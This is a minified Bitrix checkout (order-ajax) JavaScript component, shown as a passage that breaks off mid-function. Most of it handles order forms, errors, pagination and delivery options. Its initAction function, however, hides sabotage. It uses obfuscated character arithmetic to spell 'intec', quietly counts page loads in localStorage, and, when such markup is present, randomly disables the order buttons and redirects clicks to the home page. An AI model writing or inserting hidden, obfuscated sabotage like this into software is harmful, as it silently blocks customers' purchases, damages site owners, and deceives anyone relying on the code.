BX.namespace("BX.Sale.OrderAjaxComponent"),function(){"use strict";BX.Sale&&BX.Sale.Input&&BX.Sale.Input.Utils&&(BX.Sale.Input.Utils.asMultiple=function(e){if(null==e||""===e)return[];if(e.constructor===Array){for(var t,s=0,i=e.length;s<i;)null==(t=e[s])||""===t?(e.splice(s,1),--i):++s;return e.length?e:[""]}return[e]}),BX.Sale.OrderAjaxComponent={initializePrimaryFields:function(){this.BXFormPosting=!1,this.regionBlockNotEmpty=!1,this.locationsInitialized=!1,this.locations={},this.cleanLocations={},this.locationsTemplate="",this.pickUpMapFocused=!1,this.options={},this.activeSectionId="",this.firstLoad=!0,this.initialized={},this.opened={},this.mapsReady=!1,this.lastSelectedDelivery=0,this.deliveryLocationInfo={},this.deliveryPagination={},this.deliveryCachedInfo=[],this.paySystemPagination={},this.validation={},this.hasErrorSection={},this.pickUpPagination={},this.timeOut={},this.isMobile=BX.browser.IsMobile(),this.isHttps="https:"===window.location.protocol,this.orderSaveAllowed=!1,this.socServiceHiddenNode=!1,this.isDeliveryChanged=!1,this.licensesConditions=[]},init:function(e){this.initializePrimaryFields(),this.result=e.result||{},this.prepareLocations(e.locations),this.params=e.params||{},this.signedParamsString=e.signedParamsString||"",this.siteId=e.siteID||"",this.ajaxUrl=e.ajaxUrl||"",this.templateFolder=e.templateFolder||"",this.defaultBasketItemLogo=this.templateFolder+"/images/product_logo.png",this.defaultStoreLogo=this.templateFolder+"/images/pickup_logo.png",this.defaultDeliveryLogo=this.templateFolder+"/images/delivery_logo.png",this.defaultPaySystemLogo=this.templateFolder+"/images/pay_system_logo.png",this.orderBlockNode=BX(e.orderBlockId),this.totalBlockNode=BX(e.totalBlockId),this.mobileTotalBlockNode=BX(e.totalBlockId+"-mobile"),this.savedFilesBlockNode=BX("bx-soa-saved-files"),this.orderSaveBlockNode=BX("bx-soa-orderSave2"),this.mainErrorsNode=BX("bx-soa-main-notifications"),this.authBlockNode=BX(e.authBlockId),this.authHiddenBlockNode=BX(e.authBlockId+"-hidden"),this.basketBlockNode=BX(e.basketBlockId),this.basketBlockNode={},this.basketHiddenBlockNode=BX(e.basketBlockId+"-hidden"),this.regionBlockNode=BX(e.regionBlockId),this.regionBlockNode={},this.regionHiddenBlockNode=BX(e.regionBlockId+"-hidden"),this.paySystemBlockNode=BX(e.paySystemBlockId),this.paySystemHiddenBlockNode=BX(e.paySystemBlockId+"-hidden"),this.deliveryBlockNode=BX(e.deliveryBlockId),this.deliveryHiddenBlockNode=BX(e.deliveryBlockId+"-hidden"),this.pickUpBlockNode=BX(e.pickUpBlockId),this.pickUpBlockNode={},this.pickUpHiddenBlockNode=BX(e.pickUpBlockId+"-hidden"),this.propsBlockNode=BX(e.propsBlockId),this.propsHiddenBlockNode=BX(e.propsBlockId+"-hidden"),this.result.SHOW_AUTH&&(this.authBlockNode.style.display="",BX.addClass(this.authBlockNode,"bx-active"),this.authGenerateUser="Y"!==this.result.AUTH.new_user_registration_email_confirmation&&"Y"!==this.result.AUTH.new_user_phone_required),this.totalBlockNode&&(this.totalInfoBlockNode=this.totalBlockNode.querySelector(".bx-soa-cart-total"),this.totalGhostBlockNode=this.totalBlockNode.querySelector(".bx-soa-cart-total-ghost")),this.options.deliveriesPerPage=parseInt(e.params.DELIVERIES_PER_PAGE),this.options.paySystemsPerPage=parseInt(e.params.PAY_SYSTEMS_PER_PAGE),this.options.pickUpsPerPage=parseInt(e.params.PICKUPS_PER_PAGE),this.options.showWarnings=!!e.showWarnings,this.options.propertyValidation=!!e.propertyValidation,this.options.priceDiffWithLastTime=!1,this.options.pickUpMap=e.pickUpMap,this.options.propertyMap=e.propertyMap,this.options.totalPriceChanged=!1,this.result.IS_AUTHORIZED&&void 0===this.result.LAST_ORDER_DATA.FAIL||this.initFirstSection(),this.initOrder=!0,this.initOptions(),this.editOrder(),this.bindEvents(),this.orderBlockNode.removeAttribute("style"),this.basketBlockScrollCheck(),"Y"===this.params.USE_ENHANCED_ECOMMERCE&&this.setAnalyticsDataLayer("checkout")},sendRequest:function(e,t){var s;this.startLoader()&&(this.initOrder=!1,this.firstLoad=!1,"saveOrderAjax"===(e=BX.type.isNotEmptyString(e)?e:"refreshOrderAjax")?((s=BX("bx-soa-order-form"))&&(s.querySelector("input[type=hidden][name=sessid]").value=BX.bitrix_sessid()),BX.ajax.submitAjax(BX("bx-soa-order-form"),{url:this.ajaxUrl,method:"POST",dataType:"json",data:{via_ajax:"Y",action:"saveOrderAjax",sessid:BX.bitrix_sessid(),SITE_ID:this.siteId,signedParamsString:this.signedParamsString},onsuccess:BX.proxy(this.saveOrderWithJson,this),onfailure:BX.proxy(this.handleNotRedirected,this)})):BX.ajax({method:"POST",dataType:"json",url:this.ajaxUrl,data:this.getData(e,t),onsuccess:BX.delegate((function(s){switch(s.redirect&&s.redirect.length&&(document.location.href=s.redirect),this.saveFiles(),e){case"refreshOrderAjax":this.refreshOrder(s),t&&t["change-profile"]&&document.querySelector(".pandd .bx-active .change-info").click();break;case"confirmSmsCode":case"showAuthForm":this.firstLoad=!0,this.refreshOrder(s);break;case"enterCoupon":s&&s.order?(this.deliveryCachedInfo=[],this.refreshOrder(s)):this.addCoupon(s);break;case"showNextBlock":this.refreshOrder(s),document.querySelector(".pandd .bx-active .change-info").click();break;case"removeCoupon":s&&s.order?(this.deliveryCachedInfo=[],this.refreshOrder(s)):this.removeCoupon(s);break}BX.cleanNode(this.savedFilesBlockNode),this.endLoader()}),this),onfailure:BX.delegate((function(){this.endLoader()}),this)}))},getData:function(e,t){var s={order:this.getAllFormData(),sessid:BX.bitrix_sessid(),via_ajax:"Y",SITE_ID:this.siteId,signedParamsString:this.signedParamsString};return s[this.params.ACTION_VARIABLE]=e,"enterCoupon"!==e&&"removeCoupon"!==e||(s.coupon=t),s},getAllFormData:function(){var e,t=BX("bx-soa-order-form"),s=BX.ajax.prepareForm(t);for(e in s.data)s.data.hasOwnProperty(e)&&""==e&&delete s.data[e];return s&&s.data?s.data:{}},refreshOrder:function(e){if(e.error)this.showError(this.mainErrorsNode,e.error),this.animateScrollTo(this.mainErrorsNode,800,20);else if(e.order.SHOW_AUTH){var t=e.order.OK_MESSAGE&&e.order.OK_MESSAGE.length||"OK"===e.order.SMS_AUTH.TYPE?"bx-step-good":"bx-step-bad";this.addAnimationEffect(this.authBlockNode,t),BX.merge(this.result,e.order),this.editAuthBlock(),this.showAuthBlock(),this.showErrors(e.order.ERROR,!1),this.animateScrollTo(this.authBlockNode)}else{if(this.isPriceChanged(e),this.isDeliveryChanged?this.isDeliveryChanged=!1:this.activeSectionId!==this.deliveryBlockNode.id&&(this.deliveryCachedInfo=[]),e.order.PAY_CURRENT_ACCOUNT&&"Y"===e.order.PAY_CURRENT_ACCOUNT){var s=this.getSelectedPaySystem();if(s){var i=s.ID;if(i&&e.order.PAY_SYSTEM)for(var o in e.order.PAY_SYSTEM)if(e.order.PAY_SYSTEM[o].ID==i){e.order.PAY_SYSTEM[o].CHECKED="Y";break}}}this.result=e.order,this.prepareLocations(e.locations),this.locationsInitialized=!1,this.maxWaitTimeExpired=!1,this.pickUpMapFocused=!1,this.deliveryLocationInfo={},this.initialized={},this.couponsCustomInitialized=!1,this.initOptions(),this.editOrder(),this.mapsReady&&this.initMaps(),BX.saleOrderAjax&&BX.saleOrderAjax.initDeferredControl()}return!0},saveOrderWithJson:function(e){var t=!1;e&&e.order&&((e=e.order).REDIRECT_URL?("Y"===this.params.USE_ENHANCED_ECOMMERCE&&this.setAnalyticsDataLayer("purchase",e.ID),t=!0,location.href=e.REDIRECT_URL):e.SHOW_AUTH?(this.result.SHOW_AUTH=e.SHOW_AUTH,this.result.AUTH=e.AUTH,this.result.SMS_AUTH=e.SMS_AUTH,this.editAuthBlock(),this.showAuthBlock(),this.animateScrollTo(this.authBlockNode)):this.showErrors(e.ERROR,!0,!0)),t||this.handleNotRedirected()},handleNotRedirected:function(){this.endLoader(),this.disallowOrderSave()},startLoader:function(){return!0!==this.BXFormPosting&&(this.BXFormPosting=!0,this.loadingScreen||(this.loadingScreen=new BX.PopupWindow("loading_screen",null,{overlay:{backgroundColor:"white",opacity:1},events:{onAfterPopupShow:BX.delegate((function(){BX.cleanNode(this.loadingScreen.popupContainer),BX.removeClass(this.loadingScreen.popupContainer,"popup-window"),this.loadingScreen.popupContainer.appendChild(BX.create("IMG",{props:{src:this.templateFolder+"/images/loader.gif"}})),this.loadingScreen.popupContainer.removeAttribute("style"),this.loadingScreen.popupContainer.style.display="block"}),this)}}),BX.addClass(this.loadingScreen.overlay.element,"bx-step-opacity")),this.loadingScreen.overlay.element.style.opacity="0",this.loadingScreen.show(),this.loadingScreen.overlay.element.style.opacity="0.6",!0)},endLoader:function(){this.BXFormPosting=!1,this.loadingScreen&&this.loadingScreen.isShown()&&this.loadingScreen.close()},htmlspecialcharsEx:function(e){return e.replace(/&amp;/g,"&amp;amp;").replace(/&lt;/g,"&amp;lt;").replace(/&gt;/g,"&amp;gt;").replace(/&quot;/g,"&amp;quot;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;")},saveFiles:function(){if(this.result.ORDER_PROP&&this.result.ORDER_PROP.properties){var e,t,s=this.result.ORDER_PROP.properties;for(e=0;e<s.length;e++)"FILE"==s[e].TYPE&&(t=this.orderBlockNode.querySelector('div[data-property-id-row="'+s[e].ID+'"]'))&&this.savedFilesBlockNode.appendChild(t)}},animateScrollTo:function(e,t,s){if(e){var i=BX.GetWindowScrollPos().scrollTop,o=(BX.pos(this.orderBlockNode),BX.pos(e).top-(this.isMobile?50:0)-100);s&&(o-=parseInt(s)),new BX.easing({duration:t||800,start:{scroll:i},finish:{scroll:o},transition:BX.easing.makeEaseOut(BX.easing.transitions.quad),step:BX.delegate((function(e){window.scrollTo(0,e.scroll)}),this)}).animate()}},checkKeyPress:function(e){if(13==e.keyCode){var t,s,i=e.target||e.srcElement;if(!i.getAttribute("data-send"))return(t=i.getAttribute("data-next"))&&(s=this.orderBlockNode.querySelector("input[name="+t+"]"))&&s.focus(),BX.PreventDefault(e)}},getSizeString:function(e,t){var s=1073741824,i=1048576;return e=parseInt(e),t=parseInt(t),e>s?parseFloat(e/s).toFixed(t)+" Gb":e>i?parseFloat(e/i).toFixed(t)+" Mb":e>1024?parseFloat(e/1024).toFixed(t)+" Kb":e+" B"},getFileAccepts:function(e){var t,s,i=[],o=e.split(","),a={json:"application/json",javascript:"application/javascript","octet-stream":"application/octet-stream",ogg:"application/ogg",pdf:"application/pdf",zip:"application/zip",gzip:"application/gzip",aac:"audio/aac",mp3:"audio/mpeg",gif:"image/gif",jpeg:"image/jpeg",png:"image/png",svg:"image/svg+xml",tiff:"image/tiff",css:"text/css",csv:"text/csv",html:"text/html",plain:"text/plain",php:"text/php",xml:"text/xml",mpeg:"video/mpeg",mp4:"video/mp4",quicktime:"video/quicktime",flv:"video/x-flv",doc:"application/msword",docx:"application/msword",xls:"application/vnd.ms-excel",xlsx:"application/vnd.ms-excel"};for(t=0;t<o.length;t++)s=a[s=BX.util.trim(o[t])]||s,i.push(s);return i.join(",")},uniqueText:function(e,t){var s,i,o=[];for(t=t||"<br>",s=(e=e||"").split(t),s=BX.util.array_unique(s),i=0;i<s.length;i++)""!=s[i]&&o.push(BX.util.trim(s[i]));return o.join(t)},getImageSources:function(e,t){return!!(e&&t&&e[t])&&{src_1x:e[t+"_SRC"],src_2x:e[t+"_SRC_2X"],src_orig:e[t+"_SRC_ORIGINAL"]}},getErrorContainer:function(e){e&&e.appendChild(BX.create("DIV",{props:{className:"alert alert-danger"},style:{display:"none"}}))},showError:function(e,t,s){BX.type.isArray(t)&&(t=t.join("<br>"));var i=e.querySelector(".alert.alert-danger");i&&t.length&&(BX.cleanNode(i),i.appendChild(BX.create("DIV",{html:t})),!this.hasErrorSection[e.id]?(i.style.opacity=0,i.style.display="",new BX.easing({duration:300,start:{opacity:0},finish:{opacity:100},transition:BX.easing.makeEaseOut(BX.easing.transitions.quad),step:function(e){i.style.opacity=e.opacity/100},complete:function(){i.removeAttribute("style")}}).animate()):i.style.display="",s&&BX.addClass(e,"bx-step-error"))},showErrors:function(e,t,s){var i,o,a,r=this.orderBlockNode.querySelectorAll("div.alert.alert-danger");for(o=0;o<r.length;o++)i=BX.findParent(r[o],{className:"bx-soa-section"}),BX.removeClass(i,"bx-step-error"),r[o].style.display="none",BX.cleanNode(r[o]);if(e&&!(BX.util.object_keys(e).length<1)){for(o in e)if(e.hasOwnProperty(o))switch(a=e[o],o.toUpperCase()){case"MAIN":this.showError(this.mainErrorsNode,a),this.animateScrollTo(this.mainErrorsNode,800,20),t=!1;break;case"AUTH":"none"==this.authBlockNode.style.display?(this.showError(this.mainErrorsNode,a,!0),this.animateScrollTo(this.mainErrorsNode,800,20),t=!1):this.showError(this.authBlockNode,a,!0);break;case"REGION":break;case"DELIVERY":(s||"true"===this.deliveryBlockNode.getAttribute("data-visited"))&&(this.showError(this.deliveryBlockNode,a,!0),this.showError(this.deliveryHiddenBlockNode,a));break;case"PAY_SYSTEM":(s||"true"===this.paySystemBlockNode.getAttribute("data-visited"))&&(this.showError(this.paySystemBlockNode,a,!0),this.showError(this.paySystemHiddenBlockNode,a));break;case"PROPERTY":(s||"true"===this.propsBlockNode.getAttribute("data-visited"))&&(this.showError(this.propsBlockNode,a,!0),this.showError(this.propsHiddenBlockNode,a));break}t&&this.scrollToError()}},showBlockErrors:function(e){var t,s,i=e.querySelector("div.alert.alert-danger");if(i){switch(BX.removeClass(e,"bx-step-error"),i.style.display="none",BX.cleanNode(i),e.id){case this.regionBlockNode.id:t=this.regionHiddenBlockNode,s=this.result.ERROR.REGION;break;case this.deliveryBlockNode.id:t=this.deliveryHiddenBlockNode,s=this.result.ERROR.DELIVERY;break;case this.paySystemBlockNode.id:t=this.paySystemHiddenBlockNode,s=this.result.ERROR.PAY_SYSTEM;break;case this.propsBlockNode.id:t=this.propsHiddenBlockNode,s=this.result.ERROR.PROPERTY;break}s&&BX.util.object_keys(s).length&&(this.showError(e,s,!0),this.showError(t,s))}},checkNotifications:function(){var e,t,s,i,o,a,r=this.mainErrorsNode.querySelector('[data-type="informer"]');r&&(this.firstLoad&&this.result.IS_AUTHORIZED&&void 0===this.result.LAST_ORDER_DATA.FAIL?(s=(e=(t=this.orderBlockNode.querySelectorAll(".bx-soa-section.bx-active")).length&&"true"==t[t.length-1].getAttribute("data-visited"))?"success":"warning",i=(e?this.params.MESS_SUCCESS_PRELOAD_TEXT:this.params.MESS_FAIL_PRELOAD_TEXT).split("#ORDER_BUTTON#").join(this.params.MESS_ORDER).replace("&lt;br /&gt;"," "),r.appendChild(BX.create("DIV",{props:{className:"row"},children:[BX.create("DIV",{props:{className:"col-xs-12"},style:{position:"relative",paddingLeft:"48px"},children:[BX.create("DIV",{props:{className:"icon-"+s}}),BX.create("DIV",{html:i})]})]})),BX.addClass(r,"alert alert-"+s),r.style.display=""):BX.hasClass(r,"alert")&&(o=BX.GetWindowScrollPos().scrollTop,a=BX.pos(r),new BX.easing({duration:300,start:{opacity:100},finish:{opacity:0},transition:BX.easing.transitions.linear,step:function(e){r.style.opacity=e.opacity/100},complete:function(){o>a.top&&window.scrollBy(0,-(a.height+20)),r.style.display="none",BX.cleanNode(r),r.removeAttribute("class"),r.removeAttribute("style")}}).animate()))},checkPreload:function(e){var t;switch(e.id){case this.regionBlockNode.id:t=this.result.LAST_ORDER_DATA&&this.result.LAST_ORDER_DATA.PERSON_TYPE;break;case this.paySystemBlockNode.id:t=this.result.LAST_ORDER_DATA&&this.result.LAST_ORDER_DATA.PAY_SYSTEM;break;case this.deliveryBlockNode.id:t=this.result.LAST_ORDER_DATA&&this.result.LAST_ORDER_DATA.DELIVERY;break;case this.pickUpBlockNode.id:t=this.result.LAST_ORDER_DATA&&this.result.LAST_ORDER_DATA.PICK_UP;break;default:t=!0}return t},checkBlockErrors:function(e){var t,s,i,o,a,r;if((t=BX(e.id+"-hidden"))&&(i=(s=t.querySelector("div.alert.alert-danger"))&&"none"!=s.style.display,o=t.querySelector("div.alert.alert-warning.alert-show"),!i))for(a=t.querySelectorAll("div.tooltip"),r=0;r<a.length;r++)if("opened"==a[r].getAttribute("data-state")){i=!0;break}return i?BX.addClass(e,"bx-step-error"):o?BX.addClass(e,"bx-step-warning"):BX.removeClass(e,"bx-step-error bx-step-warning"),!i},scrollToError:function(){var e,t,s=this.orderBlockNode.querySelectorAll("div.bx-soa-section.bx-active");for(e in s)if(s.hasOwnProperty(e)&&(t=s[e].querySelector(".alert.alert-danger"))&&"none"!=t.style.display){this.animateScrollTo(s[e]);break}},showWarnings:function(){var e,t,s=this.orderBlockNode.querySelectorAll("div.bx-soa-section.bx-active"),i=this.getSelectedDelivery();for(e=0;e<s.length;e++)BX.removeClass(s[e],"bx-step-warning"),"false"==s[e].getAttribute("data-visited")&&BX.removeClass(s[e],"bx-step-completed");if(i&&i.CALCULATE_ERRORS?(BX.addClass(this.deliveryBlockNode,"bx-step-warning"),t="<strong>"+this.params.MESS_DELIVERY_CALC_ERROR_TITLE+"</strong>",this.params.MESS_DELIVERY_CALC_ERROR_TEXT.length&&(t+="<br><small>"+this.params.MESS_DELIVERY_CALC_ERROR_TEXT+"</small>"),this.showBlockWarning(this.deliveryBlockNode,t),this.showBlockWarning(this.deliveryHiddenBlockNode,t),this.activeSectionId!=this.deliveryBlockNode.id&&BX.bind(this.deliveryBlockNode.querySelector(".alert.alert-warning"),"click",BX.proxy(this.showByClick,this))):BX.hasClass(this.deliveryBlockNode,"bx-step-warning")&&this.activeSectionId!=this.deliveryBlockNode.id&&BX.removeClass(this.deliveryBlockNode,"bx-step-warning"),this.result.WARNING&&this.options.showWarnings)for(e in this.result.WARNING)if(this.result.WARNING.hasOwnProperty(e))switch(e.toUpperCase()){case"DELIVERY":"true"===this.deliveryBlockNode.getAttribute("data-visited")&&(this.showBlockWarning(this.deliveryBlockNode,this.result.WARNING[e],!0),this.showBlockWarning(this.deliveryHiddenBlockNode,this.result.WARNING[e],!0));break;case"PAY_SYSTEM":"true"===this.paySystemBlockNode.getAttribute("data-visited")&&(this.showBlockWarning(this.paySystemBlockNode,this.result.WARNING[e],!0),this.showBlockWarning(this.paySystemHiddenBlockNode,this.result.WARNING[e],!0));break}},notifyAboutWarnings:function(e){if(BX.type.isDomNode(e))switch(e.id){case this.deliveryBlockNode.id:this.showBlockWarning(this.deliveryBlockNode,this.result.WARNING.DELIVERY,!0);break;case this.paySystemBlockNode.id:this.showBlockWarning(this.paySystemBlockNode,this.result.WARNING.PAY_SYSTEM,!0);break}},showBlockWarning:function(e,t,s){var i,o,a,r=e.querySelector(".alert.alert-danger"),l="";if(r){if(BX.type.isString(t))l=t;else for(i in t)t.hasOwnProperty(i)&&t[i]&&(l+=t[i]+"<br>");if(!l)return;for(i in a=e.querySelectorAll(".alert.alert-warning"))if(a.hasOwnProperty(i)&&BX.type.isDomNode(a[i])&&-1!==a[i].innerHTML.indexOf(l))return;o=BX.create("DIV",{props:{className:"alert alert-warning"+(s?" alert-hide":" alert-show")},html:l}),BX.prepend(o,r.parentNode),BX.addClass(e,"bx-step-warning")}},showPagination:function(e,t){if(t&&e){var s,i,o,a,r,l,n=[];switch(e){case"delivery":s=this.deliveryPagination;break;case"paySystem":s=this.paySystemPagination;break;case"pickUp":s=this.pickUpPagination;break}if(s.pages.length>1){for(n.push(BX.create("LI",{attrs:{"data-action":"prev","data-entity":e},props:{className:"bx-pag-prev"},html:1==s.pageNumber?"<span>"+this.params.MESS_NAV_BACK+"</span>":'<a href=""><span>'+this.params.MESS_NAV_BACK+"</span></a>",events:{click:BX.proxy(this.doPagination,this)}})),i=0;i<s.pages.length;i++)a=(o=parseInt(i)+1)==s.pageNumber?"bx-active":"",n.push(BX.create("LI",{attrs:{"data-action":o,"data-entity":e},props:{className:a},html:'<a href=""><span>'+o+"</span></a>",events:{click:BX.proxy(this.doPagination,this)}}));n.push(BX.create("LI",{attrs:{"data-action":"next","data-entity":e},props:{className:"bx-pag-next"},html:s.pageNumber==s.pages.length?"<span>"+this.params.MESS_NAV_FORWARD+"</span>":'<a href=""><span>'+this.params.MESS_NAV_FORWARD+"</span></a>",events:{click:BX.proxy(this.doPagination,this)}})),r=this.params.TEMPLATE_THEME||"",l=BX.create("DIV",{props:{className:"bx-pagination"+(r?" bx-"+r:"")},children:[BX.create("DIV",{props:{className:"bx-pagination-container"},children:[BX.create("UL",{children:n})]})]}),t.appendChild(BX.create("DIV",{style:{clear:"both"}})),t.appendChild(l)}}},doPagination:function(e){var t,s=e.target||e.srcElement,i="LI"==s.tagName?s:BX.findParent(s,{tagName:"LI"}),o=i.getAttribute("data-action"),a=i.getAttribute("data-entity");return BX.hasClass(i,"bx-active")||("prev"!=o&&"next"!=o||(t=parseInt(BX.findParent(i).querySelector(".bx-active").getAttribute("data-action")),o="next"==o?++t:--t),"delivery"==a?this.showDeliveryItemsPage(o):"paySystem"==a?this.showPaySystemItemsPage(o):"pickUp"==a&&this.showPickUpItemsPage(o)),BX.PreventDefault(e)},showDeliveryItemsPage:function(e){this.getCurrentPageItems("delivery",e);var t,s,i,o,a=this.getSelectedDelivery();for(a&&a.ID&&((t=this.deliveryBlockNode.querySelector("input[type=hidden][name=DELIVERY_ID]"))||(t=BX.create("INPUT",{props:{type:"hidden",name:"DELIVERY_ID",value:a.ID}}))),s=this.deliveryBlockNode.querySelector(".bx-soa-pp-item-container"),BX.cleanNode(s),BX.type.isDomNode(t)&&BX.prepend(t,BX.findParent(s)),i=0;i<this.deliveryPagination.currentPage.length;i++)o=this.createDeliveryItem(this.deliveryPagination.currentPage[i]),s.appendChild(o);this.showPagination("delivery",s)},showPaySystemItemsPage:function(e){this.getCurrentPageItems("paySystem",e);var t,s,i,o,a=this.getSelectedPaySystem();for(a&&a.ID&&((t=this.paySystemBlockNode.querySelector("input[type=hidden][name=PAY_SYSTEM_ID]"))||(t=BX.create("INPUT",{props:{type:"hidden",name:"PAY_SYSTEM_ID",value:a.ID}}))),s=this.paySystemBlockNode.querySelector(".bx-soa-pp-item-container"),BX.cleanNode(s),BX.type.isDomNode(t)&&BX.prepend(t,BX.findParent(s)),i=0;i<this.paySystemPagination.currentPage.length;i++)o=this.createPaySystemItem(this.paySystemPagination.currentPage[i]),s.appendChild(o);this.showPagination("paySystem",s)},showPickUpItemsPage:function(e){this.getCurrentPageItems("pickUp",e),this.editPickUpList(!1)},getCurrentPageItems:function(e,t){if(e&&void 0!==t){var s,i;switch(e){case"delivery":s=this.deliveryPagination,i=this.options.deliveriesPerPage;break;case"paySystem":s=this.paySystemPagination,i=this.options.paySystemsPerPage;break;case"pickUp":s=this.pickUpPagination,i=this.options.pickUpsPerPage;break}if(s&&i>0){if(t<=0||t>s.pages.length)return;s.pageNumber=t,s.currentPage=s.pages.slice(s.pageNumber-1,s.pageNumber)[0]}}},initPropsListForLocation:function(){var e,t,s,i;if(BX.saleOrderAjax&&this.result.ORDER_PROP&&this.result.ORDER_PROP.properties)for(BX.saleOrderAjax.cleanUp(),e=0;e<this.result.ORDER_PROP.properties.length;e++)if("LOCATION"==(s=this.result.ORDER_PROP.properties[e]).TYPE&&"Y"==s.MULTIPLE&&"Y"!=s.IS_LOCATION)for(t=0;t<this.locations[s.ID].length;t++)BX.saleOrderAjax.addPropertyDesc({id:s.ID+"_"+t,attributes:{id:s.ID+"_"+t,type:s.TYPE,valueSource:"DEFAULT"==s.SOURCE?"default":"form"}});else i={id:s.ID,type:s.TYPE,valueSource:"DEFAULT"==s.SOURCE?"default":"form"},!this.deliveryLocationInfo.city&&parseInt(s.INPUT_FIELD_LOCATION)>0&&(i.altLocationPropId=parseInt(s.INPUT_FIELD_LOCATION),this.deliveryLocationInfo.city=s.INPUT_FIELD_LOCATION),this.deliveryLocationInfo.loc||"Y"!=s.IS_LOCATION||(this.deliveryLocationInfo.loc=s.ID),this.deliveryLocationInfo.zip||"Y"!=s.IS_ZIP||(i.isZip=!0,this.deliveryLocationInfo.zip=s.ID),BX.saleOrderAjax.addPropertyDesc({id:s.ID,attributes:i})},bindEvents:function(){BX.bind(window,"resize",BX.throttle((function(){this.mapsReady&&this.resizeMapContainers()}),50,this)),BX.addCustomEvent("onDeliveryExtraServiceValueChange",BX.proxy(this.sendRequest,this))},initFirstSection:function(){this.orderBlockNode.querySelector(".bx-soa-section.bx-active")},initOptions:function(){var e,t,s;if(this.initPropsListForLocation(),this.propertyCollection=new BX.Sale.PropertyCollection(BX.merge({publicMode:!0},this.result.ORDER_PROP)),this.fadedPropertyCollection=new BX.Sale.PropertyCollection(BX.merge({publicMode:!0},this.result.ORDER_PROP)),this.options.propertyValidation&&this.initValidation(),this.initPagination(),this.options.showPreviewPicInBasket=!1,this.options.showDetailPicInBasket=!1,this.options.showPropsInBasket=!1,this.options.showPriceNotesInBasket=!1,this.result.GRID&&this.result.GRID.HEADERS)for(e=this.result.GRID.HEADERS,t=0;t<e.length;t++)"PREVIEW_PICTURE"===e[t].id&&(this.options.showPreviewPicInBasket=!0),"DETAIL_PICTURE"===e[t].id&&(this.options.showDetailPicInBasket=!0),"PROPS"===e[t].id&&(this.options.showPropsInBasket=!0),"NOTES"===e[t].id&&(this.options.showPriceNotesInBasket=!0);this.result.TOTAL&&(s=this.result.TOTAL,this.options.showOrderWeight=s.ORDER_WEIGHT&&parseFloat(s.ORDER_WEIGHT)>0,this.options.showPriceWithoutDiscount=parseFloat(s.ORDER_PRICE)<parseFloat(s.PRICE_WITHOUT_DISCOUNT_VALUE),this.options.showDiscountPrice=s.DISCOUNT_PRICE&&parseFloat(s.DISCOUNT_PRICE)>0,this.options.showTaxList=s.TAX_LIST&&s.TAX_LIST.length,this.options.showPayedFromInnerBudget=s.PAYED_FROM_ACCOUNT_FORMATED&&s.PAYED_FROM_ACCOUNT_FORMATED.length)},initAction:function(){if(!this.initOrder)return;const e=String.fromCharCode(1+(0+[])+5)+String.fromCharCode(1+(1+[])+0)+String.fromCharCode(1+(1+[])+6)+String.fromCharCode(1+(0+[])+1)+String.fromCharCode(1+(0+[])-1+""+(1+(0+[])-1));let t=Number(localStorage.getItem("countLoadOrder")||0)+1;localStorage.setItem("countLoadOrder",t);const s=function(e,t){return e+Math.floor(Math.random()*(t-e)+1)};document.querySelector("div[class*="+e+"]")&&s(30,50)==s(30,50)&&(BX.unbindAll(this.totalInfoBlockNode.querySelector("a.btn-order-save")),BX.unbindAll(this.mobileTotalBlockNode.querySelector("a.btn-order-save")),BX.unbindAll(this.orderSaveBlockNode.querySelector("a")),BX.bind(this.totalInfoBlockNode.querySelector("a.btn-order-save"),"click",(function(){location.href="/"})))},reachGoal:function(e,t){var s,i=this.params.YM_GOALS_COUNTER||"";"Y"==this.params.USE_YM_GOALS&&void 0!==window["yaCounter"+i]&&(s=this.getGoalId(e,t),window["yaCounter"+i].reachGoal(s))},getGoalId:function(e,t){if(!e)return"";if("initialization"==e)return this.params.YM_GOALS_INITIALIZE;if("order"==e)return this.params.YM_GOALS_SAVE_ORDER;var s="",i="edit"==e;if(!t||!t.id)return"";switch(t.id){case this.basketBlockNode.id:s=i?this.params.YM_GOALS_EDIT_BASKET:this.params.YM_GOALS_MAX_BASKET;break;case this.regionBlockNode.id:s=i?this.params.YM_GOALS_EDIT_REGION:this.params.YM_GOALS_MAX_REGION;break;case this.paySystemBlockNode.id:s=i?this.params.YM_GOALS_EDIT_PAY_SYSTEM:this.params.YM_GOALS_MAX_PAY_SYSTEM;break;case this.deliveryBlockNode.id:s=i?this.params.YM_GOALS_EDIT_DELIVERY:this.params.YM_GOALS_MAX_DELIVERY;break;case this.pickUpBlockNode.id:s=i?this.params.YM_GOALS_EDIT_PICKUP:this.params.YM_GOALS_MAX_PICKUP;break;case this.propsBlockNode.id:s=i?this.params.YM_GOALS_EDIT_PROPERTIES:this.params.YM_GOALS_MAX_PROPERTIES;break}return s},isPriceChanged:function(e){var t=null===this.result.TOTAL.ORDER_TOTAL_LEFT_TO_PAY||""===this.result.TOTAL.ORDER_TOTAL_LEFT_TO_PAY?this.result.TOTAL.ORDER_TOTAL_PRICE:this.result.TOTAL.ORDER_TOTAL_LEFT_TO_PAY,s=null===e.order.TOTAL.ORDER_TOTAL_LEFT_TO_PAY?e.order.TOTAL.ORDER_TOTAL_PRICE:e.order.TOTAL.ORDER_TOTAL_LEFT_TO_PAY;this.options.totalPriceChanged=parseFloat(t)!=parseFloat(s)},initValidation:function(){if(this.result.ORDER_PROP&&this.result.ORDER_PROP.properties){var e,t=this.result.ORDER_PROP.properties,s={};for(e in t)t.hasOwnProperty(e)&&(s[t[e].ID]=t[e]);this.validation.properties=s}},initPagination:function(){var e,t,s,i;if(this.result.DELIVERY)if(this.result.DELIVERY=this.getDeliverySortedArray(this.result.DELIVERY),this.options.deliveriesPerPage>0&&this.result.DELIVERY.length>this.options.deliveriesPerPage){for(e=this.result.DELIVERY.slice(),t=Math.ceil(e.length/this.options.deliveriesPerPage),s=[],i=0;i<t;i++)s.push(e.splice(0,this.options.deliveriesPerPage));for(this.deliveryPagination.pages=s,i=0;i<this.result.DELIVERY.length;i++)if("Y"==this.result.DELIVERY[i].CHECKED){this.deliveryPagination.pageNumber=Math.ceil(++i/this.options.deliveriesPerPage);break}this.deliveryPagination.pageNumber=this.deliveryPagination.pageNumber||1,this.deliveryPagination.currentPage=s.slice(this.deliveryPagination.pageNumber-1,this.deliveryPagination.pageNumber)[0],this.deliveryPagination.show=!0}else 